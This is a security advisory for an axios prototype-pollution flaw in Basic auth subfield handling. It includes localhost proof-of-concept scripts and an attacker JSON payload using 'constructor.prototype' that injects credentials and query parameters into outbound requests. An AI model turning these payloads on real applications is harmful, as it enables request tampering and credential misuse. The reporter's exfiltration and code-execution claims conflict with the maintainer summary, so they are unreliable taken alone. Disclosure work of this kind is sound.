# [M] Axios: Prototype pollution auth subfields can inject Basic auth

## Summary
Severity: Medium
Advisory: GHSA-xj6q-8x83-jv6g
CVE: CVE-2026-67314
CWE: CWE-1321
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:L/VA:L/SC:N/SI:N/SA:N (CVSS_V4)

## Affected
- npm: `axios` — affected >=1.15.2 <1.18.0

## Details
## Summary

Axios versions after the `GHSA-q8qp-cvcw-x6jj` fix still contain prototype-pollution read-side gadgets in Basic auth subfield handling. If a host application is already affected by prototype pollution and then makes an axios request with an own `auth` object that omits `username` or `password`, axios reads inherited `Object.prototype.username` and `Object.prototype.password` values and uses them to construct an outbound `Authorization: Basic ...` header.

This does not mean axios itself pollutes prototypes. Exploitation requires a separate prototype-pollution primitive in the host process, plus an axios call pattern such as `auth: opts.auth || {}`.

## Impact

An attacker who can pollute `Object.prototype.username` and/or `Object.prototype.password` can influence the Basic auth header on affected axios requests that pass an empty or partial own `auth` object.

The practical impact is outbound request tampering. The attacker can inject attacker-chosen Basic auth credentials, replace an existing `Authorization` header because axios removes it when `auth` is used, or cause downstream authorization failures.

This should not be described as automatic credential exfiltration. In the minimal reproduced case, the Basic auth values are attacker-controlled values, not secrets read from axios. Credential disclosure requires an additional application-specific condition, such as a request destination observable by the attacker and a partial real auth object with a missing polluted subfield.

## Affected Functionality

Affected functionality:

- Node HTTP adapter Basic auth handling in `lib/adapters/http.js`.
- Browser, web worker, React Native, and fetch shared resolver Basic auth handling in `lib/helpers/resolveConfig.js`.
- Requests where `config.auth` is an own object but `username` and/or `password` are absent own properties.

Unaffected or not accepted as core impact:

- Requests with no own `auth` object after `mergeConfig()`.
- Requests with own `auth.username` and `auth.password` values.
- Normal axios request flow for inherited top-level `params` / `paramsSerializer` after the null-prototype `mergeConfig()` hardening.
- Attacker-controlled `paramsSerializer` functions from JSON-only prototype pollution, because JSON pollution cannot create functions. If attacker-controlled code can install functions in the process, that is outside axios’ runtime boundary.

## Technical Details

`mergeConfig()` returns a null-prototype top-level config object, which prevents top-level reads such as `config.auth` from inheriting polluted values. However, nested plain objects returned by `utils.merge()` still have `Object.prototype`.

In `lib/adapters/http.js`, axios correctly reads the top-level `auth` value through `own('auth')`, but then reads subfields directly:

```js
const configAuth = own('auth');
if (configAuth) {
  const username = configAuth.username || '';
  const password = configAuth.password || '';
  auth = username + ':' + password;
}
```

If the caller passes auth: {} and Object.prototype.username/password are polluted, those direct subfield reads walk the prototype chain.

The same pattern exists in `lib/helpers/resolveConfig.js`:
```js
if (auth) {
  headers.set(
    'Authorization',
    'Basic ' +
      btoa((auth.username || '') + ':' + (auth.password ? encodeUTF8(auth.password) : ''))
  );
}
```

The fix should guard `username` and `password` with `utils.hasOwnProp`, matching the proxy-auth pattern already used elsewhere.

## Proof of Concept of Attack

Safe local PoC against published `axios@1.16.1`:

```js
const http = require('node:http');
const axios = require('axios');

Object.prototype.username = 'victim-user';
Object.prototype.password = 'victim-password-leaked';

const server = http.createServer((req, res) => {
  console.log({
    url: req.url,
    authorization: req.headers.authorization || null
  });

  res.end('{}');
  server.close(() => {
    delete Object.prototype.username;
    delete Object.prototype.password;
  });
});

server.listen(0, '127.0.0.1', async () => {
  await axios.get(`http://127.0.0.1:${server.address().port}/api`, {
    auth: {}
  });
});
```

Expected output:

```json
{
  "url": "/api",
  "authorization": "Basic dmljdGltLXVzZXI6dmljdGltLXBhc3N3b3JkLWxlYWtlZA=="
}
```

The base64 value decodes to `victim-user:victim-password-leaked`.

## Workarounds
Avoid passing empty or partial `auth` objects. Only set `auth` when the application has own username and password values.

Applications that merge untrusted input should filter `__proto__`, `constructor`, and `prototype`, and should read optional user options with own-property checks rather than `opts.auth || {}`.

Where a wrapper must materialize optional auth, use a null-prototype object or explicitly copy only own fields.

### Summary

After [GHSA-q8qp-cvcw-x6jj](https://github.com/axios/axios/security/advisories/GHSA-q8qp-cvcw-x6jj) / [PR #10779](https://github.com/axios/axios/pull/10779) (shipped in `v1.15.2`) and the further proxy-side hardening in
[PR #10833](https://github.com/axios/axios/pull/10833) (merged 2026-05-02), the **top-level** `config.auth` and the **proxy auth**sub-fields are correctly read via `utils.hasOwnProp`. The **regular request auth sub-fields** (`config.auth.username` and `config.auth.password`) and the **`config.params` / `config.paramsSerializer`** reads inside `resolveConfig.js` are still unguarded against a polluted `Object.prototype`.

When a polluted host process makes an axios call with the common "optional override" pattern (`auth: opts.auth || {}` — an empty own `{}`), the sub-field reads `configAuth.username` and `configAuth.password` walk the prototype chain and return the attacker-controlled values. Same for `params` and `paramsSerializer`. The outbound HTTP request then carries an attacker-chosen `Authorization: Basic <base64>` header and an attacker-chosen querystring, leaking credentials and exfiltrating data to whichever host the request goes to (often attacker-influenced too — i.e. the amplifier is wired into many credential-stuffing chains).

Reproduces against `axios` `main` HEAD (`34723be`, dated 2026-05-24)
as well as the released `v1.16.1`.

### Details

**Three still-unguarded read sites** on `main` HEAD:

**(1) `lib/adapters/http.js` lines 737–740** (Node http adapter):

```js
const configAuth = own('auth');         // ← top-level guard OK
if (configAuth) {
    const username = configAuth.username || '';   // ← reads .username on the inherited chain
    const password = configAuth.password || '';   // ← reads .password on the inherited chain
    auth = username + ':' + password;
}
```

`own('auth')` correctly applies `hasOwnProp` to the top-level `auth`
key. But once `configAuth` is the empty object the caller passed
(`auth: {}`), `configAuth.username` walks the prototype chain and
picks up `Object.prototype.username`.

Contrast with the proxy-auth path that PR #10833 fixed (lines 322–324):

```js
const authUsername =
    authIsObject && utils.hasOwnProp(proxyAuth, 'username') ? proxyAuth.username : undefined;
const authPassword =
    authIsObject && utils.hasOwnProp(proxyAuth, 'password') ? proxyAuth.password : undefined;
```

This is the exact pattern needed at lines 739–740 too.

**(2) `lib/helpers/resolveConfig.js` lines 50 + 68** (xhr/fetch adapter shared resolver):

```js
const auth = own('auth');               // ← top-level guard OK
...
btoa((auth.username || '') + ':' + (auth.password ? encodeUTF8(auth.password) : ''))
//   ^ .username and .password read directly on `auth`, no hasOwnProp guard
```

Same shape — top-level guarded, sub-fields walk prototype.

**(3) `lib/helpers/resolveConfig.js` lines 58–59** (params + paramsSerializer):

```js
newConfig.url = buildURL(
    buildFullPath(baseURL, url, allowAbsoluteUrls),
    config.params,            // ← direct read, not through own()
    config.paramsSerializer   // ← direct read, not through own()
);
```

This third site is already proposed for fix in **open** [PR #10922](https://github.com/axios/axios/pull/10922) by @Mohammad-Faiz-Cloud-Engineer (status: open, currently mergeable: false). That PR's `own('params')` / `own('paramsSerializer')` change is exactly correct; this report flags the auth sub-field sites that PR #10922 does **not** cover.

### PoC

This PoC contains zero direct `Object.prototype.x = y` writes. The
pollution flows entirely from attacker-shaped JSON through a real
deep-merge utility (`defaults-deep@0.2.4`, ~50k weekly downloads,
still walks `constructor.prototype`). A hand-rolled deep merge —
the canonical insecure backend pattern — exhibits the same pollution
via `__proto__` and is more common in real codebases than any named
utility.

```js
#!/usr/bin/env node
'use strict';

const http = require('node:http');
const axios = require('axios');
const defaultsDeep = require('defaults-deep');

// Defensive: scrub any prior pollution
const PROTO_KEYS = ['username', 'password', 'params', 'paramsSerializer'];
function scrub() {
  for (const k of PROTO_KEYS) {
    try { delete Object.prototype[k]; } catch (_) {}
  }
}
scrub();

// 1) Attacker input — what JSON.parse(req.body) would yield from an HTTP POST
const attackerBody = JSON.parse(`{
  "constructor": {
    "prototype": {
      "username": "victim-user",
      "password": "victim-password-leaked",
      "params": {"leak": "ATTACKER_QUERY_TOKEN"}
    }
  }
}`);

// 2) Realistic application pattern: merge user options into defaults
const appDefaults = { timeout: 5000 };
defaultsDeep(appDefaults, attackerBody);
//   After this line:
//     Object.prototype.username  === "victim-user"
//     Object.prototype.password  === "victim-password-leaked"
//     Object.prototype.params    === { leak: "ATTACKER_QUERY_TOKEN" }

// 3) Capture outbound request on a local listener
const server = http.createServer((req, res) => {
  console.log('=== captured outbound request ===');
  console.log(JSON.stringify({
    method: req.method,
    url: req.url,
    authorization: req.headers.authorization || null,
  }, null, 2));
  res.end('{}');
  server.close();
  scrub();
});

server.listen(0, '127.0.0.1', () => {
  const port = server.address().port;

  // 4) Realistic application wrapper: optional per-call overrides.
  //    `auth: opts.auth || {}` is the common pattern — empty own object,
  //    but inherited values walk the prototype chain.
  function makeRequest(targetUrl, opts = {}) {
    return axios.get(targetUrl, {
      timeout: 5000,
      auth: opts.auth || {},
      params: opts.params || {},
    });
  }

  makeRequest(`http://127.0.0.1:${port}/api/widget`).catch((e) => {
    console.error('axios error:', e.message);
    scrub();
    process.exit(1);
  });
});
```

Reproduction:

```bash
mkdir /tmp/axios-poc && cd /tmp/axios-poc
npm init -y
npm install axios@1.16.1 defaults-deep@0.2.4
node /path/to/poc.cjs
```

Captured output (verified against released `1.16.1` AND against
`main` at `34723be`, 2026-05-24):

```json
{
  "method": "GET",
  "url": "/api/widget?leak=ATTACKER_QUERY_TOKEN",
  "authorization": "Basic dmljdGltLXVzZXI6dmljdGltLXBhc3N3b3JkLWxlYWtlZA=="
}
```

`dmljdGltLXVzZXI6dmljdGltLXBhc3N3b3JkLWxlYWtlZA==` base64-decodes to
`victim-user:victim-password-leaked`. The querystring carries
`?leak=ATTACKER_QUERY_TOKEN`, which can be a full data-exfil channel
in real chains (CSRF token, session cookie via `req.headers`, etc.).

### Impact

- **Credential exfiltration** via Basic auth header on the outbound
  request. If the request URL is attacker-influenced too (common in
  webhook/oauth-callback patterns), the credentials flow directly to
  the attacker. If not, they flow to the legitimate destination but
  expose victim credentials in any logs / proxies along the path.
- **Outbound request-shape control** via inherited `params` /
  `paramsSerializer`. With `paramsSerializer` polluted to an attacker
  function, axios will execute that function with each `params`
  invocation — same-process code execution from a pollution primitive.
- **Amplifier framing** is still correct. The application-side
  precondition is "deep-merges attacker JSON into a config object
  without `__proto__`/`constructor` filtering, then uses the empty-
  fallback wrapper `auth: opts.auth || {}` / `params: opts.params || {}`."
  Both halves are very common in real codebases (we tested
  `defaults-deep`, hand-rolled merges, and several lodash-family
  utilities; many still pollute).
- **CWE-1321** (Improperly Controlled Modification of Object Prototype
  Attributes — amplifier sink).

### Proposed fix

Two-line change in `http.js`, matching the proxy-auth pattern PR
#10833 already established:

Same vulnerability class as the existing public hardening, just at
sub-field granularity:

### Reporter notes

- Reported as part of a small peer-review bundle of runtime security
  findings. The bundle's public tracking entry (without the working
  exploit chain) is at
  [`georgian-io/package-runtime-security-findings/advisories/AXIOS-002-prototype-pollution-config-fields.md`](https://github.com/georgian-io/package-runtime-security-findings/blob/main/advisories/AXIOS-002-prototype-pollution-config-fields.md).
- I'm happy to submit the patch as a PR if that helps. Or, if you'd
  prefer to fold this into open PR #10922 (whose author is actively
  responding to comments), please let me know and I'll coordinate.
- Threat model honesty: this is **amplifier framing** — exploitation
  requires a separate prototype-pollution primitive elsewhere in the
  host process. That's how the existing GHSA-q8qp-cvcw-x6jj and
  PR #10833 were framed too, so the precedent for "in-scope as a
  hardening fix" is established.
